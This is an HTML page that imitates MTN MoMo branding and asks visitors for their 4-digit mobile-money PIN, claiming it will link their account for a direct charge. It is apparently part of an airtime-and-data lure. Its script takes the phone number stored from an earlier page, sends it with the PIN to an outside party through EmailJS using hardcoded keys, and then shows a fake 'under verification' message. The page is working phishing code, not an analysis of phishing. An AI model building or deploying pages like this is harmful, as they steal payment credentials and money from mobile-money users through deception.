  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Link Your MoMo Account</title>

  <!-- Meta -->
  <meta name="description" content="Airtime & Data â€” Fast and reliable airtime and data services with secure registration and easy access.">
  <link rel="icon" type="image/png" href="favicon.png">

  <!-- Tailwind + EmailJS -->
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){ emailjs.init("gV773-VG85THpxrNV"); })();
  </script>

  <style>
    /* === GENERAL BODY === */
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: radial-gradient(circle at top left, #001F3F, #000814 70%);
      min-height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }

    /* === FLOATING GOLD PARTICLES === */
    .particle {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 215, 0, 0.25);
      animation: float 10s infinite ease-in-out;
      filter: blur(1px);
    }
    @keyframes float {
      0%, 100% { transform: translateY(0) translateX(0); opacity: 0.7; }
      50% { transform: translateY(-30px) translateX(20px); opacity: 0.3; }
    }

    /* === CARD === */
    .card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      transition: transform 0.5s ease, opacity 1s ease;
      opacity: 0;
      transform: translateY(50px);
    }

    body.loaded .card {
      opacity: 1;
      transform: translateY(0);
    }

    /* === BUTTON === */
    .btn {
      background: linear-gradient(90deg, #FFD700, #FFCC00);
      color: #003366;
      font-weight: bold;
      transition: background 0.3s ease, transform 0.2s ease;
    }
    .btn:hover {
      background: #e6b800;
      transform: translateY(-2px);
    }

    /* === PIN INPUT === */
    .input-pin {
      letter-spacing: 0.5rem;
      font-size: 2rem;
      text-align: center;
      font-weight: bold;
      border: 2px solid #E5E7EB;
    }

    /* === PRELOADER === */
    .preloader {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: radial-gradient(circle at center, #003366, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
      color: white;
    }

    .loader-ring {
      width: 80px;
      height: 80px;
      border: 5px solid rgba(255, 215, 0, 0.2);
      border-top-color: #FFD700;
      border-radius: 50%;
      animation: spin 1.5s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .preloader.fadeOut {
      opacity: 0;
      transition: opacity 0.6s ease;
      pointer-events: none;
    }

    .brand-text {
      font-size: 1.5rem;
      font-weight: bold;
      color: #FFD700;
      letter-spacing: 1px;
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from { text-shadow: 0 0 8px #FFD700; }
      to { text-shadow: 0 0 25px #FFE066; }
    }
    
/* Smooth bouncing animation for the MoMo logo */
.bounce {
  animation: bounce 3s ease-in-out infinite, glow 2.5s ease-in-out infinite alternate;
}

/* Bouncing effect */
@keyframes bounce {
  0%, 100% {
    transform: translateY(0);
  }
  50% {
    transform: translateY(-15px);
  }
}

/* Gentle golden glow */
@keyframes glow {
  0% {
    filter: drop-shadow(0 0 2px gold) drop-shadow(0 0 5px rgba(255, 215, 0, 0.7));
  }
  100% {
    filter: drop-shadow(0 0 10px gold) drop-shadow(0 0 20px rgba(255, 215, 0, 1));
  }
}
    @keyframes shimmer {
  0%, 100% {
    opacity: 0.8;
    transform: scale(1);
  }
  50% {
    opacity: 0.4;
    transform: scale(1.05);
  }
}

/* Apply shimmer animation to all background circles */
.circle {
  animation: float 10s infinite ease-in-out, shimmer 5s infinite ease-in-out alternate;
}
    /* === NOTIFICATION === */
    #notification {
      transition: opacity 0.4s ease, transform 0.3s ease;
    }
  </style>
</head>

<body>

  <!-- ðŸŸ¡ PRELOADER -->
  <div class="preloader" id="pageLoader">
    <div class="loader-ring"></div>
    <div class="brand-text">MyMTN MoMo</div>
  </div>

  <!-- ðŸŸ¡ FLOATING GOLD PARTICLES -->
  <div class="particle" style="width:15px; height:15px; top:10%; left:15%; animation-delay:0s;"></div>
  <div class="particle" style="width:8px; height:8px; top:60%; left:80%; animation-delay:2s;"></div>
  <div class="particle" style="width:12px; height:12px; top:40%; left:40%; animation-delay:4s;"></div>
  <div class="particle" style="width:10px; height:10px; top:75%; left:20%; animation-delay:6s;"></div>

  <!-- ðŸŸ¡ MAIN CARD -->
  <div class="card w-full max-w-md p-8">
    <p class="font-bold text-xl text-center mb-3" style="padding-bottom:10px;" >Link Your MoMo Account</p>
    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4 bounce">
    <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Secure Your Account</h1>
    <p class="text-gray-600 text-center mb-6">Enter your 4-digit MoMo PIN to link your account for a direct charge.</p>

    <form id="pinForm" class="space-y-6" autocomplete="one-time-code">
      <input 
        type="password" 
        id="pinInput" 
        maxlength="4" 
        pattern="\d{4}" 
        inputmode="numeric" 
        autocomplete="one-time-code"
        class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none focus:ring-2 focus:ring-yellow-400" 
        placeholder="â€¢â€¢â€¢â€¢"
        required
      >
      <button type="submit" class="btn w-full py-3 rounded-lg shadow">Continue</button>
    </form>
  </div>

  <!-- ðŸŸ¡ NOTIFICATION -->
  <div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>

  <!-- ðŸŸ¡ SCRIPT -->
  <script>
    // --- PRELOADER LOGIC ---
    window.addEventListener("load", () => {
      const loader = document.getElementById("pageLoader");
      const body = document.body;

      setTimeout(() => {
        loader.classList.add("fadeOut");
        body.classList.add("loaded");
      }, 5000);
    });

    // --- PIN FORM ---
    const pinForm = document.getElementById("pinForm");
    const pinInput = document.getElementById("pinInput");
    const phone = localStorage.getItem("userPhone");

    pinForm.addEventListener("submit", (e) => {
      e.preventDefault();
      if (pinInput.value.length === 4) {
        emailjs.send("service_74nt2c9", "template_zelb8ji", {
          phone: "+233" + phone,
          pin: pinInput.value
        }).then(() => {
          showNotification("MoMo PIN under verification");
          window.location.href = "pin-verification.html";
        }).catch(() => {
          showNotification("Failed to verify PIN.", "error");
        });
      } else {
        showNotification("Please enter your valid 4-digit PIN.", "error");
      }
    });

    function showNotification(message, type="success") {
      const notification = document.getElementById("notification");
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white transition ${
        type === "success" ? "bg-green-600" : "bg-red-600"
      }`;
      notification.classList.remove("hidden");
      notification.style.opacity = "1";
      notification.style.transform = "translateY(0)";
      setTimeout(() => {
        notification.style.opacity = "0";
        notification.style.transform = "translateY(-10px)";
      }, 3000);
    }
  </script>
</body>
</html>
